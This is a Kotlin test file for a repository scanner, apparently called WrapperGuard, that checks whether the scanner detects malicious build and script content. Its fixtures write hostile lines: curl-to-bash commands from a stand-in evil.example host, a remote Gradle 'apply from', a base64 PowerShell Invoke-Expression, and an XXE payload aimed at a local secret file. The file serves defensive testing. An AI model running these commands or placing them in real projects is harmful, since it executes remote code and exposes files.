package com.sal7one.wrapperguard.rules

import com.sal7one.wrapperguard.core.methods.SecurityMethodCatalog
import com.sal7one.wrapperguard.core.methods.SecurityMethodIds
import com.sal7one.wrapperguard.core.model.*
import com.sal7one.wrapperguard.core.policy.*
import com.sal7one.wrapperguard.core.spi.MlScorer
import java.nio.file.Files
import java.nio.file.Path
import kotlin.io.path.writeText
import kotlin.test.*

class SecurityMethodsTest {
    private val policy = ScanPolicy(mode = EnforcementMode.ENFORCE)

    @Test fun `switches gate detector groups before execution and preserve other fingerprints`() = fixture { root ->
        root.resolve("build.gradle").writeText("apply from: 'https://evil.example/build.gradle'\n")
        root.resolve("gradlew").writeText("curl https://evil.example/install.sh | bash\n")
        val scanner = RepositoryScanner()
        val original = scanner.scan(root, policy, ScanSettings())
        val filtered = scanner.scan(root, policy, ScanSettings(methodFlags = mapOf(SecurityMethodIds.SCRIPT_RULES to false)))
        assertTrue(original.findings.any { it.ruleId.startsWith("WG-SCRIPT") })
        assertFalse(filtered.findings.any { it.ruleId.startsWith("WG-SCRIPT") })
        assertEquals(original.findings.filter { it.ruleId.startsWith("WG-BUILD") }, filtered.findings.filter { it.ruleId.startsWith("WG-BUILD") })
        assertTrue(filtered.blockers.isNotEmpty())
        assertTrue(filtered.complete)
        assertTrue(filtered.notices.any { it.code == RuleIds.METHOD_DISABLED && it.message.contains(SecurityMethodIds.SCRIPT_RULES) })
    }

    @Test fun `all methods disabled never claims a clean complete project`() = fixture { root ->
        root.resolve("gradlew").writeText("curl https://evil.example/install.sh | bash\n")
        val flags = SecurityMethodCatalog.builtInMethods.associate { it.id to false }
        val report = RepositoryScanner().scan(root, policy, ScanSettings(methodFlags = flags))
        assertEquals(ScanVerdict.INCOMPLETE, report.verdict)
        assertFalse(report.complete)
        assertTrue(report.findings.isEmpty())
        assertEquals(0, report.scannedFiles)
        assertEquals(6, report.notices.count { it.code == RuleIds.METHOD_DISABLED })
    }

    @Test fun `graph flag stops traversal findings without suppressing script detections`() = fixture { root ->
        root.resolve("gradlew").writeText("sh child.sh\n")
        root.resolve("child.sh").writeText("sh gradlew\ncurl https://evil.example/install.sh | bash\n")
        val scanner = RepositoryScanner()
        val original = scanner.scan(root, policy, ScanSettings())
        val disabled = scanner.scan(root, policy, ScanSettings(methodFlags = mapOf(SecurityMethodIds.SCRIPT_GRAPH to false)))
        assertTrue(original.edges.isNotEmpty())
        assertTrue(original.findings.any { it.ruleId == RuleIds.SCAN_CIRCULAR })
        assertTrue(disabled.edges.isEmpty())
        assertFalse(disabled.findings.any { it.ruleId == RuleIds.SCAN_CIRCULAR })
        assertTrue(disabled.findings.any { it.ruleId == RuleIds.SUPPLY_PIPE_TO_SHELL })
    }

    @Test fun `file limits include canonical seeds and recursive analysis without claiming clean`() = fixture { root ->
        root.resolve("gradlew").writeText("sh first.sh\n")
        root.resolve("first.sh").writeText("sh second.sh\n")
        root.resolve("second.sh").writeText("curl https://evil.example/install.sh | bash\n")
        val report = RepositoryScanner().scan(root, policy, ScanSettings(maxFilesPerScan = 1))
        assertTrue(report.scannedFiles <= 1)
        assertFalse(report.complete)
        assertEquals(ScanVerdict.INCOMPLETE, report.verdict)
        assertTrue(report.notices.any { it.code == RuleIds.SCAN_LIMIT && it.message.startsWith("File count") })
    }

    @Test fun `directory depth pruning is incomplete while empty leaf directories do not reduce coverage`() = fixture { root ->
        val nested = Files.createDirectories(root.resolve("one/two"))
        nested.resolve("danger.sh").writeText("curl https://evil.example/install.sh | bash\n")
        val scanner = RepositoryScanner()
        val limited = scanner.scan(root, policy, ScanSettings(maxDirectoryDepth = 1))
        assertFalse(limited.complete)
        assertTrue(limited.notices.any { it.code == RuleIds.SCAN_LIMIT && it.message.startsWith("Directory depth") })
        root.resolve("one").toFile().deleteRecursively()
        Files.createDirectory(root.resolve("empty"))
        val emptyLeaf = scanner.scan(root, policy, ScanSettings(maxDirectoryDepth = 1))
        assertTrue(emptyLeaf.complete)
        assertFalse(emptyLeaf.notices.any { it.code == RuleIds.SCAN_LIMIT })
    }

    @Test fun `legacy ML scorer cannot be invoked or downgrade deterministic blockers`() = fixture { root ->
        root.resolve("danger.ps1").writeText("Invoke-Expression ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('eA==')))\n")
        var calls = 0
        val scanner = RepositoryScanner(MlScorer { calls++; MlSignal(0.01, "legacy-model") })
        val original = RepositoryScanner().scan(root, policy, ScanSettings())
        val report = scanner.scan(root, policy, ScanSettings())
        assertTrue(original.blockers.isNotEmpty())
        assertEquals(original.findings, report.findings)
        assertEquals(0, calls)
        assertTrue(report.findings.all { it.mlSignal == null })
    }

    @Test fun `PowerShell modules and uppercase script extensions cannot bypass source routing`() = fixture { root ->
        listOf("module.psm1", "OTHER.PSM1", "DEPLOY.PS1").forEach { name ->
            root.resolve(name).writeText("Invoke-Expression ([System.Convert]::FromBase64String('eA=='))\n")
        }
        val report = RepositoryScanner().scan(root, policy, ScanSettings())
        assertTrue(report.complete)
        assertEquals(setOf("module.psm1", "OTHER.PSM1", "DEPLOY.PS1"),
            report.findings.filter { it.ruleId.startsWith("WG-SCRIPT") }.map { it.location.path }.toSet())
        assertTrue(FileTypeRouter.isScannable("fixture.BATS"))
    }

    @Test fun `Maven static checks cover unsafe repositories and changing versions independently`() = fixture { root ->
        root.resolve("pom.xml").writeText("""
            <project xmlns="http://maven.apache.org/POM/4.0.0">
              <modelVersion>4.0.0</modelVersion>
              <repositories><repository><id>unsafe</id><url>http://evil.example/repo</url></repository></repositories>
              <pluginRepositories><pluginRepository><url>https://private.example/maven</url></pluginRepository></pluginRepositories>
              <dependencies><dependency><version>1.0-SNAPSHOT</version></dependency></dependencies>
            </project>
        """.trimIndent())
        val scanner = RepositoryScanner()
        val report = scanner.scan(root, policy, ScanSettings())
        assertEquals(setOf(RuleIds.MAVEN_REPO_NOT_HTTPS, RuleIds.MAVEN_REPO_NOT_ALLOWLISTED, RuleIds.MAVEN_UNPINNED_VERSION), report.findings.filter { it.ruleId.startsWith("WG-MAVEN") }.map { it.ruleId }.toSet())
        val disabled = scanner.scan(root, policy, ScanSettings(methodFlags = mapOf(SecurityMethodIds.MAVEN_RULES to false)))
        assertFalse(disabled.findings.any { it.ruleId.startsWith("WG-MAVEN") })
        assertTrue(disabled.complete)
    }

    @Test fun `Maven parser never resolves entities and malformed POM reduces coverage`() = fixture { root ->
        val pom = root.resolve("pom.xml")
        val secret = root.resolve("secret.txt").also { it.writeText("do-not-read-or-export") }
        pom.writeText("""<!DOCTYPE project [<!ENTITY xxe SYSTEM "${secret.toUri()}">]><project><version>&xxe;</version></project>""")
        val report = RepositoryScanner().scan(root, policy, ScanSettings())
        assertFalse(report.complete)
        assertTrue(report.notices.any { it.code == RuleIds.MAVEN_UNSUPPORTED })
        assertFalse(report.findings.any { it.evidence?.text?.contains("do-not-read") == true })
        pom.writeText("<project><repositories></project>")
        assertFalse(RepositoryScanner().scan(root, policy, ScanSettings()).complete)
    }

    private fun fixture(block: (Path) -> Unit) {
        val root = Files.createTempDirectory("wg-methods-")
        try { root.resolve("settings.gradle").writeText("rootProject.name = 'test'\n"); block(root) }
        finally { root.toFile().deleteRecursively() }
    }
}
